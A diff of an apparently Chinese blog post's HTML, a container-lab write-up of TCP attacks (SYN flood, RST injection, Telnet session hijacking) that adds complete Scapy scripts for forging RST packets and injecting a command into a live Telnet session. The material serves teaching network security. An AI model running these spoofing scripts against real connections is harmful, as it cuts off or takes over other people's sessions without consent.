@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="实验环境\r容器\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n启动实验前，对容器环境进行清理，避免之前的网络配置干扰\n1 sudo docker system prune -f 进入实验目录并启动\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="实验环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n网络结构如下：\n节点 IP 地址 作用 攻击者 10.9.0.1 发送伪造 TCP 报文进行攻击 受害者 10.9.0.5 被攻击的 Telnet 客户端 用户 10.9.0.6 Telnet 服务端，攻击者的最终攻击目标 启动实验前先清理容器环境，防止被之前的网络配置干扰\n">
 <title>TCP协议攻击</title>
 
 <link rel='canonical' href='https://th4uma.github.io/post/tcp/'>
 
 <link rel="stylesheet" href="/scss/style.min.5808d9f960cd3176a76fafd720ebb8e0ace728f0632a73e61bfdce0587bb6582.css"><meta property='og:title' content="TCP协议攻击">
-<meta property='og:description' content="实验环境\r容器\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n启动实验前，对容器环境进行清理，避免之前的网络配置干扰\n1 sudo docker system prune -f 进入实验目录并启动\n">
+<meta property='og:description' content="实验环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n网络结构如下：\n节点 IP 地址 作用 攻击者 10.9.0.1 发送伪造 TCP 报文进行攻击 受害者 10.9.0.5 被攻击的 Telnet 客户端 用户 10.9.0.6 Telnet 服务端，攻击者的最终攻击目标 启动实验前先清理容器环境，防止被之前的网络配置干扰\n">
 <meta property='og:url' content='https://th4uma.github.io/post/tcp/'>
 <meta property='og:site_name' content='Thaumazein&#39;s Shelter'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-05-25T22:08:02&#43;08:00'/><meta property='article:modified_time' content='2026-05-25T22:08:02&#43;08:00'/><meta property='og:image' content='https://th4uma.github.io/images/cover/tcp.jpg' />
 <meta name="twitter:title" content="TCP协议攻击">
-<meta name="twitter:description" content="实验环境\r容器\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n启动实验前，对容器环境进行清理，避免之前的网络配置干扰\n1 sudo docker system prune -f 进入实验目录并启动\n"><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="实验环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n网络结构如下：\n节点 IP 地址 作用 攻击者 10.9.0.1 发送伪造 TCP 报文进行攻击 受害者 10.9.0.5 被攻击的 Telnet 客户端 用户 10.9.0.6 Telnet 服务端，攻击者的最终攻击目标 启动实验前先清理容器环境，防止被之前的网络配置干扰\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://th4uma.github.io/images/cover/tcp.jpg' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
@@ -272,11 +272,7 @@ unicode: "f6d2"
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#实验环境">实验环境</a>
-      <ol>
-        <li><a href="#容器">容器</a></li>
-      </ol>
-    </li>
+    <li><a href="#实验环境">实验环境</a></li>
     <li><a href="#syn-洪泛攻击">SYN 洪泛攻击</a>
       <ol>
         <li><a href="#攻击者">攻击者</a></li>
@@ -285,14 +281,14 @@ unicode: "f6d2"
     </li>
     <li><a href="#tcp-重置攻击">TCP 重置攻击</a>
       <ol>
-        <li><a href="#建立连接">建立连接</a></li>
+        <li><a href="#受害者">受害者</a></li>
         <li><a href="#攻击者-1">攻击者</a></li>
         <li><a href="#验证-1">验证</a></li>
       </ol>
     </li>
     <li><a href="#tcp-会话劫持">TCP 会话劫持</a>
       <ol>
-        <li><a href="#建立连接-1">建立连接</a></li>
+        <li><a href="#受害者-1">受害者</a></li>
         <li><a href="#攻击者-2">攻击者</a></li>
         <li><a href="#验证-2">验证</a></li>
       </ol>
@@ -300,12 +296,10 @@ unicode: "f6d2"
     <li><a href="#反向-shell-攻击">反向 Shell 攻击</a>
       <ol>
         <li><a href="#修改脚本">修改脚本</a></li>
-        <li><a href="#攻击者监听">攻击者监听</a></li>
-        <li><a href="#执行劫持">执行劫持</a></li>
+        <li><a href="#攻击者-3">攻击者</a></li>
         <li><a href="#验证-3">验证</a></li>
       </ol>
     </li>
-    <li><a href="#实验结论">实验结论</a></li>
   </ol>
 </nav>
         </div>
@@ -385,10 +379,36 @@ unicode: "f6d2"
     
     
     <h2 id="实验环境">实验环境
-</h2><h3 id="容器">容器
-</h3><p>我使用的是 Ubuntu  24.04.4，基本环境配置见<a class="link" href="https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87"  target="_blank" rel="noopener"
+</h2><p>我使用的是 Ubuntu  24.04.4，基本环境配置见<a class="link" href="https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87"  target="_blank" rel="noopener"
     >ARP攻击原理学习</a></p>
-<p>启动实验前，对容器环境进行清理，避免之前的网络配置干扰</p>
+<p>网络结构如下：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>节点</th>
+					<th>IP 地址</th>
+					<th>作用</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>攻击者</td>
+					<td><code>10.9.0.1</code></td>
+					<td>发送伪造 TCP 报文进行攻击</td>
+			</tr>
+			<tr>
+					<td>受害者</td>
+					<td><code>10.9.0.5</code></td>
+					<td>被攻击的 Telnet 客户端</td>
+			</tr>
+			<tr>
+					<td>用户</td>
+					<td><code>10.9.0.6</code></td>
+					<td>Telnet 服务端，攻击者的最终攻击目标</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>启动实验前先清理容器环境，防止被之前的网络配置干扰</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -412,7 +432,7 @@ unicode: "f6d2"
 </div><blockquote>
 <p>遇到问题：报错<code>Error response from daemon: Conflict. The container name &quot;/victim-10.9.0.5&quot; is already in use by container &quot;fd7c256895debaee38837cb83046b960c835ac339d2615eeb954516b83a15eda&quot;. You have to remove (or rename) that container to be able to reuse that name.</code></p>
 <img src="2.png" style="width: 90%;" />
-<p>这是因为之前的容器没有停止，而上面的清除命令只会清理无用的网络和停止的容器，最终导致旧容器没有被清理，开启新容器的时候命名冲突。删除旧容器即可</p>
+<p>这是因为之前的容器没有停止，而上面的清除命令只会清理无用的网络和停止的容器，导致旧容器没有被清理，开启新容器的时候命名冲突。删除旧容器即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -422,33 +442,6 @@ unicode: "f6d2"
 </span></span></code></pre></td></tr></table>
 </div>
 </div></blockquote>
-<p>网络结构包括受害者、攻击者、普通用户</p>
-<div class="table-wrapper"><table>
-  <thead>
-      <tr>
-          <th>节点</th>
-          <th>IP 地址</th>
-          <th>作用</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>攻击者</td>
-          <td><code>10.9.0.1</code></td>
-          <td>发送伪造 TCP 报文进行攻击</td>
-      </tr>
-      <tr>
-          <td>受害者</td>
-          <td><code>10.9.0.5</code></td>
-          <td>被攻击的 Telnet 客户端</td>
-      </tr>
-      <tr>
-          <td>普通用户</td>
-          <td><code>10.9.0.6</code></td>
-          <td>Telnet 服务端，会话劫持和反向 Shell 的目标</td>
-      </tr>
-  </tbody>
-</table></div>
 <p>打开三个终端分别进入对应的容器</p>
 <p>攻击者：</p>
 <div class="highlight"><div class="chroma">
@@ -468,7 +461,7 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker exec -it victim-10.9.0.5 /bin/bash
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>普通用户：</p>
+</div><p>用户：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -481,7 +474,7 @@ unicode: "f6d2"
 </h2><blockquote>
 <p>正常的TCP通信是客户端向服务器发送 SYN，服务器回复 SYN-ACK，然后等待客户端发送 ACK ，收到就连接成功，这三次发送也就是三次握手</p>
 </blockquote>
-<p>但如果攻击者一直发送大量 SYN 包而且不发送ACK完成握手，服务器就会保留大量半连接记录，数量多到半连接队列被占满时，如果正常用户需要连接服务器，就会因为服务器资源被占用导致没有办法连接</p>
+<p>但如果攻击者一直发送大量 SYN 包而且不发送ACK完成握手，服务器就会保留大量半连接记录，数量多到半连接队列被占满时，这时如果正常用户需要连接服务器，就会因为服务器资源被占用导致没有办法连接</p>
 <h3 id="攻击者">攻击者
 </h3><p>进入攻击者容器，安装编译环境</p>
 <div class="highlight"><div class="chroma">
@@ -505,7 +498,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">gcc synflood.c -o synflood
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>向受害者的 Telnet 端口发送大量 SYN 包</p>
+</div><p>向受害者的23端口发送大量 SYN 包</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -515,7 +508,7 @@ unicode: "f6d2"
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="验证">验证
-</h3><p>在普通用户容器里用telnet连接受害者，可以看到一直卡在尝试阶段，无法成功连接</p>
+</h3><p>在用户容器里用Telnet连接受害者，可以看到一直卡在尝试阶段，无法成功连接</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -534,15 +527,14 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -nat
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="5.png" style="width: 90%;" />
-<p><code>SYN_RECV</code> 表示服务器收到了 SYN 并回复 SYN-ACK，但还没有收到客户端的 ACK。大量这样的状态说明服务器半连接队列被占用，而telnet无法连接说明队列已经被占满了，导致正常请求进不去，这就是 SYN 洪泛攻击的效果</p>
+</div><p><img src="5.png" style="width: 100%;" /><code>SYN_RECV</code> 是服务器收到了 SYN ，回复 SYN-ACK，但还没有收到客户端的 ACK。出现大量这样的状态说明服务器半连接队列被占用，而Telnet无法连接说明队列已经被占满了，导致正常请求被丢包。这就是 SYN 洪泛攻击的效果</p>
 <h2 id="tcp-重置攻击">TCP 重置攻击
 </h2><blockquote>
-<p>TCP 连接建立后，只要通信一方收到看起来合法的 RST 包，就会将连接关闭</p>
+<p>TCP 连接建立后，只要连接的其中一方收到看起来合法的 RST 包，就会将连接关闭</p>
 </blockquote>
-<p>攻击者如果能伪造出源 IP、目标 IP、端口和序列号都和当前连接状态相同的 RST 报文，就能强行中断受害者与用户的连接</p>
-<h3 id="建立连接">建立连接
-</h3><p>在受害者容器中连接普通用户容器</p>
+<p>攻击者如果能伪造出源 IP、目标 IP、端口和序列号都和当前连接状态相同的 RST 报文，就能直接断开受害者与用户的连接</p>
+<h3 id="受害者">受害者
+</h3><p>受害者连接用户，账号是 <code>seed</code>，密码是 <code>dees</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -551,21 +543,65 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">telnet 10.9.0.6
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="6.png" style="width: 80%;" />
+</div><img src="6.png" style="width: 90%;" />
 <h3 id="攻击者-1">攻击者
-</h3><p>这里的脚本</p>
-<p>输入<code>ip addr</code>确认攻击者容器的网卡名，找到 <code>10.9.0.1</code> 对应的网卡，我这里是叫<code>br-4e1873a46169</code></p>
-<img src="3.png" style="width: 90%;" />
-<p>打开 <code>reset_auto.py</code> 和 <code>hijacking_auto.py</code>，把代码末尾 <code>sniff()</code> 函数中的 <code>iface</code> 改成实际网卡名，这里的网卡名必须和本机环境一致，否则脚本可能运行正常，但实际抓不到目标流量</p>
+</h3><p>输入<code>ip addr</code>确认攻击者容器的网卡名，找到 <code>10.9.0.1</code> 对应的网卡，我这里是叫<code>br-4e1873a46169</code></p>
+<img src="3.png" style="width: 100%;" />
+<p>打开攻击脚本<code>reset_auto.py</code>，把代码末尾 <code>sniff()</code> 函数中的 <code>iface</code> 改成实际的网卡名，否则脚本正常运行，但实际上抓不到目标的通信流量</p>
+<p>脚本监听用户 <code>10.9.0.6</code> 发给受害者 <code>10.9.0.5</code> 的 Telnet 包。抓到包后读取原包的端口和确认号，再伪造一个看起来像受害者发出的 RST 包。<code>flags=&quot;R&quot;</code> 也就是重置连接，<code>seq=old_tcp.ack</code> 是为了让伪造包的序列号合法。用户收到这个 RST 包后会认为连接被另一边关闭</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sniff(iface=&#39;br-4e1873a46169&#39;, filter=f, prn=spoof_pkt)
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">old_tcp</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">old_ip</span>  <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">old_ip</span><span class="o">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">old_ip</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">old_tcp</span><span class="o">.</span><span class="n">dport</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="n">old_tcp</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;R&#34;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">old_tcp</span><span class="o">.</span><span class="n">ack</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pkt</span> <span class="o">=</span> <span class="n">ip</span><span class="o">/</span><span class="n">tcp</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ls</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span><span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">client</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">myFilter</span> <span class="o">=</span> <span class="s1">&#39;tcp and src host </span><span class="si">{}</span><span class="s1"> and dst host </span><span class="si">{}</span><span class="s1"> and src port 23&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="n">client</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Running RESET attack ...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Filter used: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">myFilter</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Spoofing RESET packets from Client (</span><span class="si">{}</span><span class="s2">) to Server (</span><span class="si">{}</span><span class="s2">)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">server</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;br-4e1873a46169&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">myFilter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>在攻击者容器中运行重置攻击脚本</p>
+</div><p>在攻击者容器中运行攻击脚本，这里可以看到伪造报文的结构</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -574,18 +610,14 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 reset_auto.py 10.9.0.5 10.9.0.6
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>脚本会监听 <code>10.9.0.5</code> 和 <code>10.9.0.6</code> 之间的 TCP 流量，并根据捕获到的数据包构造对应的 RST 报文</p>
-<img src="7.png" style="width: 90%;" />
+</div><img src="7.png" style="width: 100%;" />
 <h3 id="验证-1">验证
-</h3><p>回到受害者的 Telnet 界面，随便按下一个键触发通信</p>
-<p>如果攻击成功，连接会被强制关闭</p>
-<img src="8.png" style="width: 80%;" />
-<p>这说明攻击者伪造的 RST 包被当前 TCP 会话接受，Telnet 连接被远程关闭</p>
+</h3><p>回到受害者的 Telnet 界面，随便输入一个字符，如果攻击成功，连接会被强制关闭，这说明攻击者伪造的 RST 包被当成合法包接受了</p>
+<img src="8.png" style="width: 90%;" />
 <h2 id="tcp-会话劫持">TCP 会话劫持
-</h2><p>TCP 会话劫持的目标不是断开连接，而是向已有连接中注入数据。Telnet 这种明文协议没有额外的加密和完整性保护，只要攻击者能构造出符合当前 TCP 状态的数据包，服务端就可能把注入内容当作真实客户端发送的数据处理</p>
-<p>本实验中，攻击者会劫持 <code>10.9.0.5</code> 到 <code>10.9.0.6</code> 的 Telnet 会话，并向服务端注入命令，让服务端创建 <code>/tmp/success</code> 文件</p>
-<h3 id="建立连接-1">建立连接
-</h3><p>在受害者容器中登录普通用户容器</p>
+</h2><p>TCP 会话劫持就是向已有的连接中注入数据。Telnet 协议没有额外的加密和保护，攻击者如果能构造出和当前 TCP 状态相同的数据包，服务端就可能把注入内容当成客户端发来的数据</p>
+<h3 id="受害者-1">受害者
+</h3><p>受害者连接用户</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -594,9 +626,76 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">telnet 10.9.0.6
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>登录账号为 <code>seed</code>，密码为 <code>dees</code></p>
-<h3 id="攻击者-2">攻击者
-</h3><p>在攻击者容器中运行会话劫持脚本</p>
+</div><h3 id="攻击者-2">攻击者
+</h3><p>打开攻击脚本<code>hijacking_auto.py</code>，把代码末尾 <code>sniff()</code> 函数中的 <code>iface</code> 改成实际的网卡名</p>
+<p>脚本监听用户 <code>10.9.0.6</code> 发给受害者 <code>10.9.0.5</code> 的 Telnet 包，再伪造一个看起来像受害者发出的数据包，把创建 <code>/tmp/success</code> 文件的命令注入到这个包中，<code>flags=&quot;A&quot;</code> 表示这是一个 ACK 包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">old_ip</span>  <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">old_tcp</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tcp_len</span> <span class="o">=</span> <span class="n">old_ip</span><span class="o">.</span><span class="n">len</span> <span class="o">-</span> <span class="n">old_ip</span><span class="o">.</span><span class="n">ihl</span><span class="o">*</span><span class="mi">4</span> <span class="o">-</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">dataofs</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># TCP data length</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">newseq</span> <span class="o">=</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">ack</span> <span class="o">+</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl">    <span class="n">newack</span> <span class="o">=</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">seq</span> <span class="o">+</span> <span class="n">tcp_len</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">old_ip</span><span class="o">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">old_ip</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">old_tcp</span><span class="o">.</span><span class="n">dport</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="n">old_tcp</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;A&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">              <span class="n">seq</span><span class="o">=</span><span class="n">newseq</span><span class="p">,</span> <span class="n">ack</span><span class="o">=</span><span class="n">newack</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">touch /tmp/success</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pkt</span> <span class="o">=</span> <span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">data</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ls</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span><span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">myFilter</span> <span class="o">=</span> <span class="s1">&#39;tcp and src host </span><span class="si">{}</span><span class="s1"> and dst host </span><span class="si">{}</span><span class="s1"> and src port 23&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">srv</span><span class="p">,</span> <span class="n">cli</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Running Session Hijacking attack ...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Filter used: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">myFilter</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Spoofing TCP packets from Client (</span><span class="si">{}</span><span class="s2">) to Server (</span><span class="si">{}</span><span class="s2">)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">srv</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;br-4e1873a46169&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">myFilter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在攻击者容器中运行劫持脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -605,37 +704,26 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 hijacking_auto.py 10.9.0.5 10.9.0.6
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="9.png" style="width: 90%;" />
-<p>脚本会等待目标连接产生数据包，然后根据当前连接状态构造注入包。这里脚本设置了序列号偏移量，所以需要在受害者 Telnet 界面中连续输入 10 个字符来触发攻击</p>
+</div><img src="9.png" style="width: 100%;" />
 <h3 id="验证-2">验证
-</h3><p>在受害者 Telnet 界面中连续输入 10 个字符</p>
-<p>然后在普通用户容器中查看 <code>/tmp/success</code> 是否被创建</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -l /tmp/success
-</span></span></code></pre></td></tr></table>
-</div>
-</div><img src="10.png" style="width: 80%;" />
-<p>如果能够看到 <code>/tmp/success</code> 文件，说明攻击者注入的命令已经被 <code>10.9.0.6</code> 执行，会话劫持成功</p>
